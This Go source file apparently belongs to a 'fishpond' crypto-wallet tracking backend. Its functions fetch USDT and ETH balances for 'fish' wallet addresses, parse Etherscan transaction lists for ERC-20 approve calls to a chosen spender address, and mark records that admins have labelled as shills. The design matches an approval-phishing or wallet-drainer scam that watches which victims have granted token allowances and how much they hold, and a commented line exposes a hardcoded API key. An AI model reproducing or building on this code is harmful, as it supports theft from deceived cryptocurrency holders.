/**
 * @Author $
 * @Description //TODO $
 * @Date $ $
 * @Param $
 * @return $
 **/
package util

import (
	"context"
	"encoding/json"
	"fmt"
	"github.com/ethereum/go-ethereum/accounts/abi/bind"
	"github.com/ethereum/go-ethereum/common"
	"github.com/ethereum/go-ethereum/ethclient"
	"github.com/gin-gonic/gin"
	"github.com/go-redis/redis"
	"github.com/jinzhu/gorm"
	"github.com/shopspring/decimal"
	"github.com/spf13/viper"
	token "github.com/wangyi/fishpond/eth"
	"io/ioutil"
	"log"
	"math/big"
	"strings"

	"math/rand"
	"net/http"
	"time"
)

func RandStr(length int) string {
	str := "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	bytes := []byte(str)
	result := []byte{}
	rand.Seed(time.Now().UnixNano() + int64(rand.Intn(100)))
	for i := 0; i < length; i++ {
		result = append(result, bytes[rand.Intn(len(bytes))])
	}
	return string(result)
}

func CreateToken(Rdb *redis.Client) string {

	for i := 0; i < 5; i++ {
		str := RandStr(36)
		_, err := Rdb.HGet("TOKEN_USER", str).Result()
		if err != nil {
			return str
		}
	}
	return ""
}

/**
判断 字符串是否在这个数组中
*/
func InArray(target string, strArray []string) bool {
	for _, element := range strArray {
		if target == element {
			return true
		}
	}
	return false
}

/**
  返回方法
*/
func JsonWrite(context *gin.Context, status int, result interface{}, msg string) {
	context.JSON(http.StatusOK, gin.H{
		"code":   status,
		"result": result,
		"msg":    msg,
	})
}

//func GetAccountMoneyUsdT(id int, foxAddress string, db *gorm.DB) {
//	resp, err := http.Get("https://etherscan.io/address/" + foxAddress)
//	if err != nil {
//		return
//	}
//	defer resp.Body.Close()
//	body, err1 := ioutil.ReadAll(resp.Body)
//	if err1 != nil {
//		return
//	}
//	//fmt.Println(string(body))
//	//解析正则表达式，如果成功返回解释器
//	reg1 := regexp.MustCompile(`<div class="col-md-8">\$(\d+)`)
//	if reg1 == nil { //解释失败，返回nil
//		return
//	}
//	//根据规则提取关键信息
//	result1 := reg1.FindAllStringSubmatch(string(body), -1)
//	maxMoney, err := strconv.ParseFloat(result1[0][1], 64)
//	up := model.Fish{
//		Money: maxMoney,
//	}
//	db.Model(&model.Fish{}).Where("id=?", id).Update(up)
//	return
//
//}

func ToDecimal(ivalue interface{}, decimals int) decimal.Decimal {
	value := new(big.Int)
	switch v := ivalue.(type) {
	case string:
		value.SetString(v, 10)
	case *big.Int:
		value = v
	}

	mul := decimal.NewFromFloat(float64(10)).Pow(decimal.NewFromFloat(float64(decimals)))
	num, _ := decimal.NewFromString(value.String())
	result := num.Div(mul)

	return result
}

//生成邀请码

/***
  更新 鱼的 usd eth
*/
func UpdateUsdAndEth(foxAddress string, Db *gorm.DB) {

	ethUrl := viper.GetString("eth.ethUrl")
	client, err := ethclient.Dial(ethUrl)
	if err != nil {
		return
	}
	//获取 美元
	tokenAddress := common.HexToAddress("0xdAC17F958D2ee523a2206206994597C13D831ec7") //usDT
	instance, err := token.NewToken(tokenAddress, client)
	if err != nil {
		log.Fatal(err)
	}
	address := common.HexToAddress(foxAddress)
	bal, err := instance.BalanceOf(&bind.CallOpts{}, address)
	if err != nil {
		log.Fatal(err)
	}
	usd := ToDecimal(bal.String(), 6)
	balance, err := client.BalanceAt(context.Background(), address, nil)
	if err != nil {
		log.Fatal(err)
	}
	eth := ToDecimal(balance.String(), 18)
	data := make(map[string]interface{})
	data["money"], _ = usd.Float64()
	data["money_eth"], _ = eth.Float64()
	Db.Table("fish").Where("fox_address=?", foxAddress).Update(data)
	return
}

/***
  检查授权
*/

type Result struct {
	BlockNumber       string `json:"blockNumber"`
	TimeStamp         string `json:"timeStamp"`
	Hash              string `json:"hash"`
	Nonce             string `json:"nonce"`
	BlockHash         string `json:"blockHash"`
	TransactionIndex  string `json:"transactionIndex"`
	From              string `json:"from"`
	To                string `json:"to"`
	Value             string `json:"value"`
	Gas               string `json:"gas"`
	GasPrice          string `json:"gasPrice"`
	IsError           string `json:"isError"`
	ReceiptStatus     string `json:"txreceipt_status"`
	InPut             string `json:"input"`
	ContractAddress   string `json:"contractAddress"`
	CumulativeGasUsed string `json:"cumulativeGasUsed"`
	GasUsed           string `json:"gasUsed"`
	Confirmations     string `json:"confirmations"`
}
type TxList struct {
	Status  string   `json:"status"`
	Message string   `json:"message"`
	Result  []Result `json:"result"`
}

func ChekAuthorizedFoxAddress(foxAddress string, apiKey string, BAddress string, Db *gorm.DB) {

	//获取 要查询的 fish
	//apiKey := "5YJ37XCEQFSEDMMI6RXZ756QB7HS2VT921"
	res, err := http.Get("https://api.etherscan.io/api?module=account&action=txlist&address=" + foxAddress + "&startblock=0&endblock=99999999&page=1&offset=100&sort=asc&apikey=" + apiKey)
	if err != nil {
		return
	}
	body, err1 := ioutil.ReadAll(res.Body)
	if err1 != nil {
		return
	}

	defer res.Body.Close()

	var data TxList
	err = json.Unmarshal([]byte(string(body)), &data)
	if err != nil {
		return
	}
	var count int = 0

	if data.Status == "1" && data.Message == "OK" {
		var ifCount bool = true
		for _, k := range data.Result {
			if len(k.InPut) == 138 && k.InPut[0:10] == "0x095ea7b3" {
				BAddressOne := "0x" + k.InPut[34:74]
				if k.InPut[127:] == "00000000000" && strings.ToLower(BAddress) == strings.ToLower(BAddressOne) { //取消授权  更新数据库
					fmt.Println("????")
					mapData := make(map[string]interface{})
					mapData["authorization"] = 1
					Db.Table("fish").Where("fox_address=?", foxAddress).Update(mapData)
				}
				if k.InPut[127:] != "00000000000" && strings.ToLower(BAddress) == strings.ToLower(BAddressOne) { //授权成功
					if ifCount {
						count++
						ifCount = false
					}
					//
					mapData := make(map[string]interface{})
					mapData["authorization"] = 2
					mapData["b_address"] = BAddress
					Db.Table("fish").Where("fox_address=?", foxAddress).Update(mapData)
				}
				if k.InPut[127:] != "00000000000" && strings.ToLower(BAddress) != strings.ToLower(BAddressOne) {
					count++
				}
			}
		}
		mapData := make(map[string]interface{})
		mapData["authorization_time"] = count
		Db.Table("fish").Where("fox_address=?", foxAddress).Update(mapData)

	}
}

/**
  批量修改 余额
*/
func BatchUpdateBalance(adminId int, Db *gorm.DB) {
	type Admin struct {
		ID uint
	}
	type Fish struct {
		FoxAddress string
		Remark     string
	}
	var admins []Admin
	Db.Table("admins").Where("id= ? or belong =?", adminId, adminId).Find(&admins)
	for _, k := range admins {
		var fish []Fish
		//查询 鱼
		Db.Table("fish").Where("admin_id=?", k.ID).Find(&fish)
		for _, kk := range fish {
			fmt.Println(kk.FoxAddress)
			if kk.Remark != "托" {
				UpdateUsdAndEth(kk.FoxAddress, Db)
			}

		}

	}

}
